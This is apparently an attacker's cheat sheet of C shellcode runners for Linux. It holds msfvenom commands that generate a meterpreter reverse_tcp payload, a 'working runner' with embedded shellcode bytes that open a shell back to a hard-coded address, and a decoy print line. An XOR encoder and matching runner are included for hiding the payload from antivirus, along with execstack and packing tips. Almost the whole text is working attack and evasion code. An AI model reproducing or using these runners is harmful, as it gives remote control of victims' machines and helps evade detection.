    //msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f c
    //Compile and run:  gcc -o hack.out hack.c -z execstack


    **Compiling to work with older kernels/gcc:
    docker pull gcc:4.9
    docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -o test.elf test.c
    //or use -static (might need to reduce size w/ UPX)

    //might need 32bit!!

    **set MeterpreterTryToFork true; set PrependFork true


    ###############WORKING RUNNER:###############
    /*
    //Replace SCSSIZE & PAYLOAD

    Simple ELF shellcode runner

    Reference:
            * https://tuttlem.github.io/2017/10/28/executing-shellcode-in-c.html 
            * https://stackoverflow.com/questions/27900201/create-and-test-x86-64-elf-executable-shellcode-on-a-linux-machine
            * https://man7.org/linux/man-pages/man2/mprotect.2.html
            * https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates
    */
    #include <unistd.h>
    #include <sys/mman.h>

    #define SCSSIZE 574

    // msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f c
    unsigned char PAYLOAD[SCSSIZE] = 
    "\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
    "\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
    "\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
    "\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
    "\x20\xfb\xc0\xa8\x31\x79\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
    "\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
    "\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
    "\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
    "\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
    "\x78\xed\xff\xe6";

    // msf template below
    //unsigned char PAYLOAD[SCSSIZE] = "PAYLOAD: ";

    int main(int argc, char *argv[]) {
        printf("I love programming.\n");
            // create executable memory
        mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC);  
        int (*exeshell)() = (int (*)()) PAYLOAD;  
        (int)(*exeshell)(); // execute shellcode
        
            return 3;
    }


    ##########Another Basic Runner:##########
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    unsigned char buf[] = 
    ....
    int main (int argc, char **argv) 
    {
    // Run our shellcode
    int (*ret)() = (int(*)())buf;
    ret();
    }

    ###########################ENCODED RUNNER###########################
    #########Encoder:#########
    //msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f c
    // gcc -o encoder.out encoder.c; ./encoder.out

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    unsigned char buf[] =
    ...........
    int main (int argc, char **argv) 
    {
    char xor_key = 'J';
    int payload_length = (int) sizeof(buf);
    for (int i=0; i<payload_length; i++)
    {
    printf("\\x%02X",buf[i]^xor_key);
    }
    return 0;
    }


    #########Runner:#########
    //Compile and run:  gcc -o hack.out hack.c -z execstack

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    // Our obfuscated shellcode
    unsigned char buf[] = 
    "\x20\x73\x12\x45\x4F\x02\xCF\x8A...x32\x71\x02\xDD\x02\xF3\x48";
    int main (int argc, char **argv) 
    {
    char xor_key = 'J';
    int arraysize = (int) sizeof(buf);
    for (int i=0; i<arraysize-1; i++)
    {
    buf[i] = buf[i]^xor_key;
    }
    int (*ret)() = (int(*)())buf;
    ret();
    }
